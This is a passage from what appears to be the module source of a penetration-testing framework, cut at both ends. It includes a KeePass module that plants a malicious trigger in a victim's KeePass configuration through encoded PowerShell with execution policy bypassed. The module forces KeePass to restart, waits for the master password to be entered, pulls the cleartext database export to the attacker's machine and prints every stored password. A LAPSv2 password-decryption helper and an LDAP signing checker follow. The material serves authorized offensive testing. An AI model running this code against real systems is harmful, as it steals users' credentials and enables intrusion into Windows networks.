is executed):\n                                  ENCODE        run scripts through encoded oneliners\n                                  PS1           run scripts through a file dropped in C:\\\\Windows\\\\Temp (default)\n\n        Not all variables used by the module are available as options (ex: trigger name, temp folder path, etc.),\n        but they can still be easily edited in the module __init__ code if needed\n        """"""\n\n        if ""ACTION"" in module_options:\n            if module_options[""ACTION""] not in [\n                ""ADD"",\n                ""CHECK"",\n                ""RESTART"",\n                ""SINGLE_POLL"",\n                ""POLL"",\n                ""CLEAN"",\n                ""ALL"",\n            ]:\n                context.log.fail(""Unrecognized action, use --options to list available parameters"")\n                exit(1)\n            else:\n                self.action = module_options[""ACTION""]\n        else:\n            context.log.fail(""Missing ACTION option, use --options to list available parameters"")\n            exit(1)\n\n        if ""KEEPASS_CONFIG_PATH"" in module_options:\n            self.keepass_config_path = module_options[""KEEPASS_CONFIG_PATH""]\n\n        if ""USER"" in module_options:\n            self.keepass_user = module_options[""USER""]\n\n        if ""EXPORT_NAME"" in module_options:\n            self.export_name = module_options[""EXPORT_NAME""]\n\n        if ""EXPORT_PATH"" in module_options:\n            self.export_path = module_options[""EXPORT_PATH""]\n\n        if ""PSH_EXEC_METHOD"" in module_options:\n            if module_options[""PSH_EXEC_METHOD""] not in [""ENCODE"", ""PS1""]:\n                context.log.fail(""Unrecognized powershell execution method, use --options to list available parameters"")\n                exit(1)\n            else:\n                self.powershell_exec_method = module_options[""PSH_EXEC_METHOD""]\n\n    def on_admin_login(self, context, connection):\n        if self.action == ""ADD"":\n            self.add_trigger(context, connection)\n        elif self.action == ""CHECK"":\n            self.check_trigger_added(context, connection)\n        elif self.action == ""RESTART"":\n            self.restart(context, connection)\n        elif self.action == ""POLL"":\n            self.poll(context, connection)\n        elif self.action == ""CLEAN"":\n            self.clean(context, connection)\n            self.restart(context, connection)\n        elif self.action == ""ALL"":\n            self.all_in_one(context, connection)\n\n    def add_trigger(self, context, connection):\n        """"""Add a malicious trigger to a remote KeePass config file using the powershell script AddKeePassTrigger.ps1""""""\n\n        # check if the specified KeePass configuration file exists\n        if self.trigger_added(context, connection):\n            context.log.display(f""The specified configuration file {self.keepass_config_path} already contains a trigger called \'{self.trigger_name}\', skipping"")\n            return\n\n        context.log.display(f""Adding trigger \'{self.trigger_name}\' to \'{self.keepass_config_path}\'"")\n\n        # prepare the trigger addition script based on user-specified parameters (e.g: trigger name, etc)\n        # see data/keepass_trigger_module/AddKeePassTrigger.ps1 for the full script\n        self.add_trigger_script_str = self.add_trigger_script_str.replace(""REPLACE_ME_ExportPath"", self.export_path)\n        self.add_trigger_script_str = self.add_trigger_script_str.replace(""REPLACE_ME_ExportName"", self.export_name)\n        self.add_trigger_script_str = self.add_trigger_script_str.replace(""REPLACE_ME_TriggerName"", self.trigger_name)\n        self.add_trigger_script_str = self.add_trigger_script_str.replace(""REPLACE_ME_KeePassXMLPath"", self.keepass_config_path)\n\n        # add the malicious trigger to the remote KeePass configuration file\n        if self.powershell_exec_method == ""ENCODE"":\n            add_trigger_script_b64 = b64encode(self.add_trigger_script_str.encode(""UTF-16LE"")).decode(""utf-8"")\n            add_trigger_script_cmd = f""powershell.exe -e {add_trigger_script_b64}""\n            connection.execute(add_trigger_script_cmd)\n            sleep(2)  # as I noticed some delay may happen with the encoded powershell command execution\n        elif self.powershell_exec_method == ""PS1"":\n            try:\n                self.put_file_execute_delete(context, connection, self.add_trigger_script_str)\n            except Exception as e:\n                context.log.fail(f""Error while adding malicious trigger to file: {e}"")\n                sys.exit(1)\n\n        # checks if the malicious trigger was effectively added to the specified KeePass configuration file\n        if self.trigger_added(context, connection):\n            context.log.success(f""Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files"")\n        else:\n            context.log.fail(f""Unknown error when adding malicious trigger to file"")\n            sys.exit(1)\n\n    def check_trigger_added(self, context, connection):\n        """"""check if the trigger is added to the config file XML tree""""""\n\n        if self.trigger_added(context, connection):\n            context.log.display(f""Malicious trigger \'{self.trigger_name}\' found in \'{self.keepass_config_path}\'"")\n        else:\n            context.log.display(f""No trigger \'{self.trigger_name}\' found in \'{self.keepass_config_path}\'"")\n\n    def restart(self, context, connection):\n        """"""Force the restart of KeePass process using a Windows service defined using the powershell script RestartKeePass.ps1\n        If multiple process belonging to different users are running simultaneously,\n        relies on the USER option to choose which one to restart""""""\n\n        # search for keepass processes\n        search_keepass_process_command_str = \'powershell.exe ""Get-Process keepass* -IncludeUserName | Select-Object -Property Id,UserName,ProcessName | ConvertTo-CSV -NoTypeInformation""\'\n        search_keepass_process_output_csv = connection.execute(search_keepass_process_command_str, True)\n        # we return the powershell command as a CSV for easier column parsing\n        csv_reader = reader(search_keepass_process_output_csv.split(""\\n""), delimiter="","")\n        next(csv_reader)  # to skip the header line\n        keepass_process_list = list(csv_reader)\n        # check if multiple processes belonging to different users are running (in order to choose which one to restart)\n        keepass_users = []\n        for process in keepass_process_list:\n            keepass_users.append(process[1])\n        if len(keepass_users) == 0:\n            context.log.fail(""No running KeePass process found, aborting restart"")\n            return\n        elif len(keepass_users) == 1:  # if there is only 1 KeePass process running\n            # if KEEPASS_USER option is specified then we check if the user matches\n            if self.keepass_user and (keepass_users[0] != self.keepass_user and keepass_users[0].split(""\\\\"")[1] != self.keepass_user):\n                context.log.fail(f""Specified user {self.keepass_user} does not match any KeePass process owner, aborting restart"")\n                return\n            else:\n                self.keepass_user = keepass_users[0]\n        elif len(keepass_users) > 1 and self.keepass_user:\n            found_user = False  # we search through every KeePass process owner for the specified user\n            for user in keepass_users:\n                if user == self.keepass_user or user.split(""\\\\"")[1] == self.keepass_user:\n                    self.keepass_user = keepass_users[0]\n                    found_user = True\n            if not found_user:\n                context.log.fail(f""Specified user {self.keepass_user} does not match any KeePass process owner, aborting restart"")\n                return\n        else:\n            context.log.fail(""Multiple KeePass processes were found, please specify parameter USER to target one"")\n            return\n\n        context.log.display(""Restarting {}\'s KeePass process"".format(keepass_users[0]))\n\n        # prepare the restarting script based on user-specified parameters (e.g: keepass user, etc)\n        # see data/keepass_trigger_module/RestartKeePass.ps1\n        self.restart_keepass_script_str = self.restart_keepass_script_str.replace(""REPLACE_ME_KeePassUser"", self.keepass_user)\n        self.restart_keepass_script_str = self.restart_keepass_script_str.replace(""REPLACE_ME_KeePassBinaryPath"", self.keepass_binary_path)\n        self.restart_keepass_script_str = self.restart_keepass_script_str.replace(""REPLACE_ME_DummyServiceName"", self.dummy_service_name)\n\n        # actually performs the restart on the remote target\n        if self.powershell_exec_method == ""ENCODE"":\n            restart_keepass_script_b64 = b64encode(self.restart_keepass_script_str.encode(""UTF-16LE"")).decode(""utf-8"")\n            restart_keepass_script_cmd = ""powershell.exe -e {}"".format(restart_keepass_script_b64)\n            connection.execute(restart_keepass_script_cmd)\n        elif self.powershell_exec_method == ""PS1"":\n            try:\n                self.put_file_execute_delete(context, connection, self.restart_keepass_script_str)\n            except Exception as e:\n                context.log.fail(""Error while restarting KeePass: {}"".format(e))\n                return\n\n    def poll(self, context, connection):\n        """"""Search for the cleartext database export file in the specified export folder\n        (until found, or manually exited by the user)""""""\n        found = False\n        context.log.display(f""Polling for database export every {self.poll_frequency_seconds} seconds, please be patient"")\n        context.log.display(""we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything"")\n        # if the specified path is %APPDATA%, we need to check in every user\'s folder\n        if self.export_path == ""%APPDATA%"" or self.export_path == ""%appdata%"":\n            poll_export_command_str = ""powershell.exe \\""Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output (\'C:\\\\Users\\\\\'+$_.Name+\'\\\\AppData\\\\Roaming\\\\{}\')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}\\"""".format(self.export_name)\n        else:\n            export_full_path = f""\'{self.export_path}\\\\{self.export_name}\'""\n            poll_export_command_str = \'powershell.exe ""if (Test-Path {} -PathType leaf){{ Write-Output {} }}""\'.format(export_full_path, export_full_path)\n\n        # we poll every X seconds until the export path is found on the remote machine\n        while not found:\n            poll_exports_command_output = connection.execute(poll_export_command_str, True)\n            if self.export_name not in poll_exports_command_output:\n                print(""."", end="""", flush=True)\n                sleep(self.poll_frequency_seconds)\n                continue\n            print("""")\n\n            # once a database is found, downloads it to the attackers machine\n            context.log.success(""Found database export !"")\n            # in case multiple exports found (may happen if several users exported the database to their APPDATA)\n            for count, export_path in enumerate(poll_exports_command_output.split(""\\r\\n"")):\n                try:\n                    buffer = BytesIO()\n                    connection.conn.getFile(self.share, export_path.split("":"")[1], buffer.write)\n\n                    # if multiple exports found, add a number at the end of local path to prevent override\n                    if count > 0:\n                        local_full_path = self.local_export_path + ""/"" + self.export_name.split(""."")[0] + ""_"" + str(count) + ""."" + self.export_name.split(""."")[1]\n                    else:\n                        local_full_path = self.local_export_path + ""/"" + self.export_name\n\n                    # downloads the exported database\n                    with open(local_full_path, ""wb"") as f:\n                        f.write(buffer.getbuffer())\n                    remove_export_command_str = ""powershell.exe Remove-Item {}"".format(export_path)\n                    connection.execute(remove_export_command_str, True)\n                    context.log.success(\'Moved remote ""{}"" to local ""{}""\'.format(export_path, local_full_path))\n                    found = True\n                except Exception as e:\n                    context.log.fail(""Error while polling export files, exiting : {}"".format(e))\n\n    def clean(self, context, connection):\n        """"""Checks for database export + malicious trigger on the remote host, removes everything""""""\n        # if the specified path is %APPDATA%, we need to check in every user\'s folder\n        if self.export_path == ""%APPDATA%"" or self.export_path == ""%appdata%"":\n            poll_export_command_str = ""powershell.exe \\""Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output (\'C:\\\\Users\\\\\'+$_.Name+\'\\\\AppData\\\\Roaming\\\\{}\')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}\\"""".format(self.export_name)\n        else:\n            export_full_path = f""\'{self.export_path}\\\\{self.export_name}\'""\n            poll_export_command_str = \'powershell.exe ""if (Test-Path {} -PathType leaf){{ Write-Output {} }}""\'.format(export_full_path, export_full_path)\n        poll_export_command_output = connection.execute(poll_export_command_str, True)\n\n        # deletes every export found on the remote machine\n        if self.export_name in poll_export_command_output:\n            # in case multiple exports found (may happen if several users exported the database to their APPDATA)\n            for export_path in poll_export_command_output.split(""\\r\\n""):\n                context.log.display(f""Database export found in \'{export_path}\', removing"")\n                remove_export_command_str = f""powershell.exe Remove-Item {export_path}""\n                connection.execute(remove_export_command_str, True)\n        else:\n            context.log.display(f""No export found in {self.export_path} , everything is cleaned"")\n\n        # if the malicious trigger was not self-deleted, deletes it\n        if self.trigger_added(context, connection):\n            # prepare the trigger deletion script based on user-specified parameters (e.g: trigger name, etc)\n            # see data/keepass_trigger_module/RemoveKeePassTrigger.ps1\n            self.remove_trigger_script_str = self.remove_trigger_script_str.replace(""REPLACE_ME_KeePassXMLPath"", self.keepass_config_path)\n            self.remove_trigger_script_str = self.remove_trigger_script_str.replace(""REPLACE_ME_TriggerName"", self.trigger_name)\n\n            # actually performs trigger deletion\n            if self.powershell_exec_method == ""ENCODE"":\n                remove_trigger_script_b64 = b64encode(self.remove_trigger_script_str.encode(""UTF-16LE"")).decode(""utf-8"")\n                remove_trigger_script_command_str = f""powershell.exe -e {remove_trigger_script_b64}""\n                connection.execute(remove_trigger_script_command_str, True)\n            elif self.powershell_exec_method == ""PS1"":\n                try:\n                    self.put_file_execute_delete(context, connection, self.remove_trigger_script_str)\n                except Exception as e:\n                    context.log.fail(f""Error while deleting trigger, exiting: {e}"")\n                    sys.exit(1)\n\n            # check if the specified KeePass configuration file does not contain the malicious trigger anymore\n            if self.trigger_added(context, connection):\n                context.log.fail(f""Unknown error while removing trigger \'{self.trigger_name}\', exiting"")\n            else:\n                context.log.display(f""Found trigger \'{self.trigger_name}\' in configuration file, removing"")\n        else:\n            context.log.success(f""No trigger \'{self.trigger_name}\' found in \'{self.keepass_config_path}\', skipping"")\n\n    def all_in_one(self, context, connection):\n        """"""Performs ADD, RESTART, POLL and CLEAN actions one after the other""""""\n        context.log.highlight("""")\n        self.add_trigger(context, connection)\n        context.log.highlight("""")\n        self.restart(context, connection)\n        self.poll(context, connection)\n        context.log.highlight("""")\n        context.log.display(""Cleaning everything..."")\n        self.clean(context, connection)\n        self.restart(context, connection)\n        context.log.highlight("""")\n        context.log.display(""Extracting password..."")\n        self.extract_password(context)\n\n    def trigger_added(self, context, connection):\n        """"""check if the trigger is added to the config file XML tree (returns True/False)""""""\n        # check if the specified KeePass configuration file exists\n        if not self.keepass_config_path:\n            context.log.fail(""No KeePass configuration file specified, exiting"")\n            sys.exit(1)\n\n        try:\n            buffer = BytesIO()\n            connection.conn.getFile(self.share, self.keepass_config_path.split("":"")[1], buffer.write)\n        except Exception as e:\n            context.log.fail(f""Error while getting file \'{self.keepass_config_path}\', exiting: {e}"")\n            sys.exit(1)\n\n        try:\n            keepass_config_xml_root = ElementTree.fromstring(buffer.getvalue())\n        except Exception as e:\n            context.log.fail(f""Error while parsing file \'{self.keepass_config_path}\', exiting: {e}"")\n            sys.exit(1)\n\n        # check if the specified KeePass configuration file does not already contain the malicious trigger\n        for trigger in keepass_config_xml_root.findall("".//Application/TriggerSystem/Triggers/Trigger""):\n            if trigger.find(""Name"").text == self.trigger_name:\n                return True\n\n        return False\n\n    def put_file_execute_delete(self, context, connection, psh_script_str):\n        """"""Helper to upload script to a temporary folder, run then deletes it""""""\n        script_str_io = StringIO(psh_script_str)\n        connection.conn.putFile(self.share, self.remote_temp_script_path.split("":"")[1], script_str_io.read)\n        script_execute_cmd = ""powershell.exe -ep Bypass -F {}"".format(self.remote_temp_script_path)\n        connection.execute(script_execute_cmd, True)\n        remove_remote_temp_script_cmd = \'powershell.exe ""Remove-Item ""{}""""\'.format(self.remote_temp_script_path)\n        connection.execute(remove_remote_temp_script_cmd)\n\n    def extract_password(self, context):\n        xml_doc_path = os.path.abspath(self.local_export_path + ""/"" + self.export_name)\n        xml_tree = ElementTree.parse(xml_doc_path)\n        root = xml_tree.getroot()\n        to_string = ElementTree.tostring(root, encoding=""UTF-8"", method=""xml"")\n        xml_to_dict = parse(to_string)\n        dump = json.dumps(xml_to_dict)\n        obj = json.loads(dump)\n\n        if len(obj[""KeePassFile""][""Root""][""Group""][""Entry""]):\n            for obj2 in obj[""KeePassFile""][""Root""][""Group""][""Entry""]:\n                for password in obj2[""String""]:\n                    if password[""Key""] == ""Password"":\n                        context.log.highlight(str(password[""Key""]) + "" : "" + str(password[""Value""][""#text""]))\n                    else:\n                        context.log.highlight(str(password[""Key""]) + "" : "" + str(password[""Value""]))\n                context.log.highlight("""")\n        if len(obj[""KeePassFile""][""Root""][""Group""][""Group""]):\n            for obj2 in obj[""KeePassFile""][""Root""][""Group""][""Group""]:\n                try:\n                    for obj3 in obj2[""Entry""]:\n                        for password in obj3[""String""]:\n                            if password[""Key""] == ""Password"":\n                                context.log.highlight(str(password[""Key""]) + "" : "" + str(password[""Value""][""#text""]))\n                            else:\n                                context.log.highlight(str(password[""Key""]) + "" : "" + str(password[""Value""]))\n                        context.log.highlight("""")\n                except KeyError:\n                    pass\n', 'laps.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom pyasn1.codec.der import decoder\nfrom pyasn1_modules import rfc5652\n\nfrom impacket.ldap import ldap as ldap_impacket\nfrom impacket.krb5.kerberosv5 import KerberosError\nfrom impacket.dcerpc.v5 import transport\nfrom impacket.dcerpc.v5.epm import hept_map\nfrom impacket.dcerpc.v5.gkdi import MSRPC_UUID_GKDI, GkdiGetKey, GroupKeyEnvelope\nfrom impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY\nfrom impacket.dpapi_ng import EncryptedPasswordBlob, KeyIdentifier, compute_kek, create_sd, decrypt_plaintext, unwrap_cek\n\nfrom cme.logger import CMEAdapter\n\nldap_error_status = {\n    ""1"": ""STATUS_NOT_SUPPORTED"",\n    ""533"": ""STATUS_ACCOUNT_DISABLED"",\n    ""701"": ""STATUS_ACCOUNT_EXPIRED"",\n    ""531"": ""STATUS_ACCOUNT_RESTRICTION"",\n    ""530"": ""STATUS_INVALID_LOGON_HOURS"",\n    ""532"": ""STATUS_PASSWORD_EXPIRED"",\n    ""773"": ""STATUS_PASSWORD_MUST_CHANGE"",\n    ""775"": ""USER_ACCOUNT_LOCKED"",\n    ""50"": ""LDAP_INSUFFICIENT_ACCESS"",\n    ""KDC_ERR_CLIENT_REVOKED"": ""KDC_ERR_CLIENT_REVOKED"",\n    ""KDC_ERR_PREAUTH_FAILED"": ""KDC_ERR_PREAUTH_FAILED"",\n}\n\n\nclass LDAPConnect:\n    def __init__(self, host, port, hostname):\n        self.logger = None\n        self.proto_logger(host, port, hostname)\n\n    def proto_logger(self, host, port, hostname):\n        self.logger = CMEAdapter(extra={""protocol"": ""LDAP"", ""host"": host, ""port"": port, ""hostname"": hostname})\n\n    def kerberos_login(self, domain, username, password="""", ntlm_hash="""", aesKey="""", kdcHost="""", useCache=False):\n        lmhash = """"\n        nthash = """"\n\n        if kdcHost is None:\n            kdcHost = domain\n\n        # This checks to see if we didn\'t provide the LM Hash\n        if ntlm_hash and ntlm_hash.find("":"") != -1:\n            lmhash, nthash = ntlm_hash.split("":"")\n        elif ntlm_hash:\n            nthash = ntlm_hash\n\n        # Create the baseDN\n        baseDN = """"\n        domainParts = domain.split(""."")\n        for i in domainParts:\n            baseDN += f""dc={i},""\n        # Remove last \',\'\n        baseDN = baseDN[:-1]\n\n        try:\n            ldapConnection = ldap_impacket.LDAPConnection(f""ldap://{kdcHost}"", baseDN)\n            ldapConnection.kerberosLogin(\n                username,\n                password,\n                domain,\n                lmhash,\n                nthash,\n                aesKey,\n                kdcHost=kdcHost,\n                useCache=False,\n            )\n            # Connect to LDAP\n            out = f""{domain}{username}:{password if password else ntlm_hash}""\n            self.logger.extra[""protocol""] = ""LDAP""\n            self.logger.extra[""port""] = ""389""\n            return ldapConnection\n        except ldap_impacket.LDAPSessionError as e:\n            if str(e).find(""strongerAuthRequired"") >= 0:\n                # We need to try SSL\n                try:\n                    ldapConnection = ldap_impacket.LDAPConnection(f""ldaps://{kdcHost}"", baseDN)\n                    ldapConnection.login(\n                        username,\n                        password,\n                        domain,\n                        lmhash,\n                        nthash,\n                        aesKey,\n                        kdcHost=kdcHost,\n                        useCache=False,\n                    )\n                    self.logger.extra[""protocol""] = ""LDAPS""\n                    self.logger.extra[""port""] = ""636""\n                    # self.logger.success(out)\n                    return ldapConnection\n                except ldap_impacket.LDAPSessionError as e:\n                    errorCode = str(e).split()[-2][:-1]\n                    self.logger.fail(\n                        f""{domain}\\\\{username}:{password if password else ntlm_hash} {ldap_error_status[errorCode] if errorCode in ldap_error_status else \'\'}"",\n                        color=""magenta"" if errorCode in ldap_error_status else ""red"",\n                    )\n            else:\n                errorCode = str(e).split()[-2][:-1]\n                self.logger.fail(\n                    f""{domain}\\\\{username}:{password if password else ntlm_hash} {ldap_error_status[errorCode] if errorCode in ldap_error_status else \'\'}"",\n                    color=""magenta"" if errorCode in ldap_error_status else ""red"",\n                )\n            return False\n\n        except OSError as e:\n            self.logger.debug(f""{domain}\\\\{username}:{password if password else ntlm_hash} {\'Error connecting to the domain, please add option --kdcHost with the FQDN of the domain controller\'}"")\n            return False\n        except KerberosError as e:\n            self.logger.fail(\n                f""{domain}\\\\{username}:{password if password else ntlm_hash} {str(e)}"",\n                color=""red"",\n            )\n            return False\n\n    def auth_login(self, domain, username, password, ntlm_hash):\n        lmhash = """"\n        nthash = """"\n\n        # This checks to see if we didn\'t provide the LM Hash\n        if ntlm_hash and ntlm_hash.find("":"") != -1:\n            lmhash, nthash = ntlm_hash.split("":"")\n        elif ntlm_hash:\n            nthash = ntlm_hash\n\n        # Create the baseDN\n        baseDN = """"\n        domainParts = domain.split(""."")\n        for i in domainParts:\n            baseDN += f""dc={i},""\n        # Remove last \',\'\n        baseDN = baseDN[:-1]\n\n        try:\n            ldapConnection = ldap_impacket.LDAPConnection(f""ldap://{domain}"", baseDN, domain)\n            ldapConnection.login(username, password, domain, lmhash, nthash)\n\n            # Connect to LDAP\n            out = ""{domain}\\\\{username}:{password if password else ntlm_hash}""\n            self.logger.extra[""protocol""] = ""LDAP""\n            self.logger.extra[""port""] = ""389""\n            # self.logger.success(out)\n\n            return ldapConnection\n\n        except ldap_impacket.LDAPSessionError as e:\n            if str(e).find(""strongerAuthRequired"") >= 0:\n                # We need to try SSL\n                try:\n                    ldapConnection = ldap_impacket.LDAPConnection(f""ldaps://{domain}"", baseDN, domain)\n                    ldapConnection.login(username, password, domain, lmhash, nthash)\n                    self.logger.extra[""protocol""] = ""LDAPS""\n                    self.logger.extra[""port""] = ""636""\n                    # self.logger.success(out)\n                    return ldapConnection\n                except ldap_impacket.LDAPSessionError as e:\n                    errorCode = str(e).split()[-2][:-1]\n                    self.logger.fail(\n                        f""{domain}\\\\{username}:{password if password else ntlm_hash} {ldap_error_status[errorCode] if errorCode in ldap_error_status else \'\'}"",\n                        color=""magenta"" if errorCode in ldap_error_status else ""red"",\n                    )\n            else:\n                errorCode = str(e).split()[-2][:-1]\n                self.logger.fail(\n                    f""{domain}\\\\{username}:{password if password else ntlm_hash} {ldap_error_status[errorCode] if errorCode in ldap_error_status else \'\'}"",\n                    color=""magenta"" if errorCode in ldap_error_status else ""red"",\n                )\n            return False\n\n        except OSError as e:\n            self.logger.debug(f""{domain}\\\\{username}:{password if password else ntlm_hash} {\'Error connecting to the domain, please add option --kdcHost with the FQDN of the domain controller\'}"")\n            return False\n\nclass LAPSv2Extract:\n    def __init__(self, data, username, password, domain, ntlm_hash, do_kerberos, kdcHost, port):\n        if ntlm_hash.find("":"") != -1:\n            self.lmhash, self.nthash = ntlm_hash.split("":"")\n        else:\n            self.nthash = ntlm_hash\n            self.lmhash = \'\'\n\n        self.data = data\n        self.username = username\n        self.password = password\n        self.domain = domain\n        self.do_kerberos = do_kerberos\n        self.kdcHost = kdcHost\n        self.logger = None\n        self.proto_logger(self.domain, port, self.domain)\n\n    def proto_logger(self, host, port, hostname):\n        self.logger = CMEAdapter(extra={""protocol"": ""LDAP"", ""host"": host, ""port"": port, ""hostname"": hostname})\n\n    def run(self):\n        KDSCache = {}\n        self.logger.info(\'[-] Unpacking blob\')\n        try:\n            encryptedLAPSBlob = EncryptedPasswordBlob(self.data)\n            parsed_cms_data, remaining = decoder.decode(encryptedLAPSBlob[\'Blob\'], asn1Spec=rfc5652.ContentInfo())\n            enveloped_data_blob = parsed_cms_data[\'content\']\n            parsed_enveloped_data, _ = decoder.decode(enveloped_data_blob, asn1Spec=rfc5652.EnvelopedData())\n\n            recipient_infos = parsed_enveloped_data[\'recipientInfos\']\n            kek_recipient_info = recipient_infos[0][\'kekri\']\n            kek_identifier = kek_recipient_info[\'kekid\']\n            key_id = KeyIdentifier(bytes(kek_identifier[\'keyIdentifier\']))\n            tmp,_ = decoder.decode(kek_identifier[\'other\'][\'keyAttr\'])\n            sid = tmp[\'field-1\'][0][0][1].asOctets().decode(""utf-8"")\n            target_sd = create_sd(sid)\n        except Exception as e:\n            logging.error(\'Cannot unpack msLAPS-EncryptedPassword blob due to error %s\' % str(e))\n            return\n\n        # Check if item is in cache\n        if key_id[\'RootKeyId\'] in KDSCache:\n            self.logger.info(""Got KDS from cache"")\n            gke = KDSCache[key_id[\'RootKeyId\']]\n        else:\n            # Connect on RPC over TCP to MS-GKDI to call opnum 0 GetKey\n            stringBinding = hept_map(destHost=self.domain, remoteIf=MSRPC_UUID_GKDI, protocol=\'ncacn_ip_tcp\')\n            rpctransport = transport.DCERPCTransportFactory(stringBinding)\n            if hasattr(rpctransport, \'set_credentials\'):\n                rpctransport.set_credentials(username=self.username, password=self.password, domain=self.domain, lmhash=self.lmhash, nthash=self.nthash)\n            if self.do_kerberos:\n                self.logger.info(""Connecting using kerberos"")\n                rpctransport.set_kerberos(self.do_kerberos, kdcHost=self.kdcHost)\n\n            dce = rpctransport.get_dce_rpc()\n            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)\n            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n            self.logger.info(""Connecting to %s"" % stringBinding)\n            try:\n                dce.connect()\n            except Exception as e:\n                logging.error(""Something went wrong, check error status => %s"" % str(e))\n                return False\n            self.logger.info(""Connected"")\n            try:\n                dce.bind(MSRPC_UUID_GKDI)\n            except Exception as e:\n                logging.error(""Something went wrong, check error status => %s"" % str(e))\n                return False\n            self.logger.info(""Successfully bound"")\n\n\n            self.logger.info(""Calling MS-GKDI GetKey"")\n            resp = GkdiGetKey(dce, target_sd=target_sd, l0=key_id[\'L0Index\'], l1=key_id[\'L1Index\'], l2=key_id[\'L2Index\'], root_key_id=key_id[\'RootKeyId\'])\n            self.logger.info(""Decrypting password"")\n            # Unpack GroupKeyEnvelope\n            gke = GroupKeyEnvelope(b\'\'.join(resp[\'pbbOut\']))\n            KDSCache[gke[\'RootKeyId\']] = gke\n\n        kek = compute_kek(gke, key_id)\n        self.logger.info(""KEK:\\t%s"" % kek)\n        enc_content_parameter = bytes(parsed_enveloped_data[""encryptedContentInfo""][""contentEncryptionAlgorithm""][""parameters""])\n        iv, _ = decoder.decode(enc_content_parameter)\n        iv = bytes(iv[0])\n\n        cek = unwrap_cek(kek, bytes(kek_recipient_info[\'encryptedKey\']))\n        self.logger.info(""CEK:\\t%s"" % cek)\n        plaintext = decrypt_plaintext(cek, iv, remaining)\n        self.logger.info(plaintext[:-18].decode(\'utf-16le\'))\n        return plaintext[:-18].decode(\'utf-16le\')', 'ldap-checker.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport socket\nimport ssl\nimport asyncio\n\nfrom msldap.connection import MSLDAPClientConnection\nfrom msldap.commons.target import MSLDAPTarget\n\nfrom asyauth.common.constants import asyauthSecret\nfrom asyauth.common.credentials.ntlm import NTLMCredential\nfrom asyauth.common.credentials.kerberos import KerberosCredential\n\nfrom asysocks.unicomm.common.target import UniTarget, UniProto\n\nclass CMEModule:\n    """"""\n    Checks whether LDAP signing and channelbinding are required.\n\n    Module by LuemmelSec (@theluemmel), updated by @zblurx\n    Original work thankfully taken from @zyn3rgy\'s Ldap Relay Scan project: https://github.com/zyn3rgy/LdapRelayScan\n    """"""\n\n    name = ""ldap-checker""\n    description = ""Checks whether LDAP signing and binding are required and / or enforced""\n    supported_protocols = [""ldap""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        No options available.\n        """"""\n        pass\n\n    def on_login(self, context, connection):\n        # Conduct a bind to LDAPS and determine if channel\n        # binding is enforced based on the contents of potential\n        # errors returned. This can be determined unauthenticated,\n        # because the error indicating channel binding enforcement\n        # will be returned regardless of a successful LDAPS bind.\n        async def run_ldaps_noEPA(target, credential):\n            ldapsClientConn = MSLDAPClientConnection(target, credential)\n            _, err = await ldapsClientConn.connect()\n            if err is not None:\n                context.log.fail(""ERROR while connecting to "" + str(connection.domain) + "": "" + str(err))\n                exit()\n            _, err = await ldapsClientConn.bind()\n            if ""data 80090346"" in str(err):\n                return True  # channel binding IS enforced\n            elif ""data 52e"" in str(err):\n                return False  # channel binding not enforced\n            elif err is None:\n                # LDAPS bind successful\n                # because channel binding is not enforced\n                return False\n\n        # Conduct a bind to LDAPS with channel binding supported\n        # but intentionally miscalculated. In the case that and\n        # LDAPS bind has without channel binding supported has occured,\n        # you can determine whether the policy is set to ""never"" or\n        # if it\'s set to ""when supported"" based on the potential\n        # error recieved from the bind attempt.\n        async def run_ldaps_withEPA(target, credential):\n            ldapsClientConn = MSLDAPClientConnection(target, credential)\n            _, err = await ldapsClientConn.connect()\n            if err is not None:\n                context.log.fail(""ERROR while connecting to "" + str(connection.domain) + "": "" + str(err))\n                exit()\n            # forcing a miscalculation of the ""Channel Bindings"" av pair in Type 3 NTLM message\n            ldapsClientConn.cb_data = b""\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00""\n            _, err = await ldapsClientConn.bind()\n            if ""data 80090346"" in str(err):\n                return True\n            elif ""data 52e"" in str(err):\n                return False\n            elif err is not None:\n                context.log.fail(""ERROR while connecting to "" + str(connection.domain) + "": "" + str(err))\n            elif err is None:\n                return False\n\n        # Domain Controllers do not have a certificate setup for\n        # LDAPS on port 636 by default. If this has not been setup,\n        # the TLS handshake will hang and you will not be able to\n        # interact with LDAPS. The condition for the certificate\n        # existing as it should is either an error regarding\n        # the fact that the certificate is self-signed, or\n        # no error at all. Any other ""successful"" edge cases\n        # not yet accounted for.\n        def DoesLdapsCompleteHandshake(dcIp):\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(5)\n            ssl_sock = ssl.wrap_socket(\n                s,\n                cert_reqs=ssl.CERT_OPTIONAL,\n                suppress_ragged_eofs=False,\n                do_handshake_on_connect=False,\n            )\n            ssl_sock.connect((dcIp, 636))\n            try:\n                ssl_sock.do_handshake()\n                ssl_sock.close()\n                return True\n            except Exception as e:\n                if ""CERTIFICATE_VERIFY_FAILED"" in str(e):\n                    ssl_sock.close()\n                    return True\n                if ""handshake operation timed out"" in str(e):\n                    